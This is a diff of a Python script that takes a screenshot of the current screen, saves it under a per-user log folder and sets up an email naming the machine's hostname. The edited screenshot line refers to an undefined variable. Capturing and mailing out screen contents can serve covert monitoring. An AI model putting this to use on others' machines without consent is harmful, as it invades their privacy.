@@ -9,9 +9,15 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 
+#OS
+import os
+
 #provide email/Password
 email_user = ''
 email_password = ''
+
+User = os.getenv('USERNAME')
+
 
 #sets up email message
 msg = MIMEMultipart()
@@ -19,15 +25,15 @@ msg['From'] = email_user
 msg['To'] = email_user
 msg['Subject'] = 'Current Status'
 
-h = platform.uname()[1]
+Device = platform.uname()[1]
 
-body = "Status on {}".format(h)
+body = "Status on {}".format(Device)
 
 msg.attach(MIMEText(body,'plain')) 
 
 
 #screenshot current screen
-pyautogui.screenshot('/Users/Users/Documents')
+pyautogui.screenshot('/Users/' + Users + '/Documents/Log/' + filename)
 
 
 
